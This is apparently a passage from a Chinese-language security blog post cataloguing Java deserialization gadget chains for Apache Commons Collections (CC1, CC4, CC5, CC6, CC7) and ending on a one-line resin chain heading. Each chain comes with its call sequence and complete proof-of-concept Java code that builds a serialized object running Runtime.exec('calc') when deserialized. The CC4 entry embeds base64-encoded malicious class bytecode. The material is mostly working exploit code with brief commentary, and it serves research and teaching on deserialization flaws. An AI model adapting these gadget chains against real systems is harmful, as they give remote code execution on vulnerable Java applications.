<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import javassist.CannotCompileException;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.NotFoundException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(&quot;CommonsCollections333333333&quot;);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] bytes=payload.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        field1.setAccessible(true);</span><br><span class="line">        field1.set(templatesImpl,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);</span><br><span class="line">        Map map=new HashMap();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class cls=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=constructor.newInstance(Override.class,map1);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));</span><br><span class="line">        outputStream.writeObject(object);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
### CC4 4.0，jdk7u21及以前 因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                        -&gt;ConstantTransformer.transform()</span><br><span class="line">                                    -&gt;InstantiateTransformer.transform()</span><br><span class="line">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                 -&gt;TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
详细代码
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollections4 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            //字节码</span><br><span class="line">            byte[] code = Base64.decode(&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;);</span><br><span class="line"></span><br><span class="line">            //反射设置 Field</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">            //Transformer数组</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            //TransformingComparator 实例</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            //PriorityQueue 实例</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            //先设置为正常变量值，后面可以通过setFieldValue修改</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            //反射设置 Field</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;queue&quot;, objects);</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            //序列化</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            //测试反序列化</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC5 BadAttributeValueExpException-&gt;TiedMapEntry.toString() -&gt;LazyMap.get()
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">-&gt;BadAttributeValueExpException.readObject()</span><br><span class="line">      -&gt;TiedMapEntry.toString()</span><br><span class="line">          -&gt;TiedMapEntry.getValue()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                            -&gt;InvokerTransformer.transform()</span><br><span class="line">                                -&gt;…………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections5 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //Transformer数组</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //ChainedTransformer实例</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        //TiedMapEntry 实例</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        //BadAttributeValueExpException 实例</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">        //反射设置 val</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        //测试反序列化</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC6   1，3链换头  换成hashmap.hashcode()
 
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span><br><span class="line">  -&gt;HashMap.readObject()</span><br><span class="line">      -&gt;HashMap.putForCreate()</span><br><span class="line">          -&gt;HashMap.hash()</span><br><span class="line">            -&gt;TiedMapEntry.hashCode()</span><br><span class="line">                    -&gt;TiedMapEntry.getValue()</span><br><span class="line">                    -&gt;LazyMap.get()</span><br><span class="line">                      -&gt;ChainedTransformer.transform()</span><br><span class="line">                          -&gt;ConstantTransformer.transform()</span><br><span class="line">                              -&gt;InvokerTransformer.transform()</span><br><span class="line">                                  -&gt;…………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = new Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //ChainedTransformer实例</span><br><span class="line">        //先设置假的 Transformer 数组，防止生成时执行命令</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        //TiedMapEntry 实例</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //通过反射设置真的 ransformer 数组</span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        //清空由于 hashMap.put 对 LazyMap 造成的影响</span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        //测试反序列化</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC7  1=3 2=4  5 6 7 头部都不一样
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chain:</span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        final String[] execArgs = new String[]&#123;&quot;calc&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    final Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                    new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                    new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                    new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                    new Class[]&#123;String.class&#125;,</span><br><span class="line">                    execArgs),</span><br><span class="line">            new ConstantTransformer(1)&#125;;</span><br><span class="line"></span><br><span class="line">    Map innerMap1 = new HashMap();</span><br><span class="line">    Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">    // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span><br><span class="line">    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line"></span><br><span class="line">    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">    // Use the colliding Maps as keys in Hashtable</span><br><span class="line">    Hashtable hashtable = new Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, 1);</span><br><span class="line">    hashtable.put(lazyMap2, 2);</span><br><span class="line"></span><br><span class="line">    SerializeUtil.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span><br><span class="line"></span><br><span class="line">    // Needed to ensure hash collision after previous manipulations</span><br><span class="line">    lazyMap2.remove(&quot;yy&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### resin  前HashMap.putVal()后ContinuationContext.composeName()-&gt;&gt;NamingManager.getObjectFactoryFromReference()
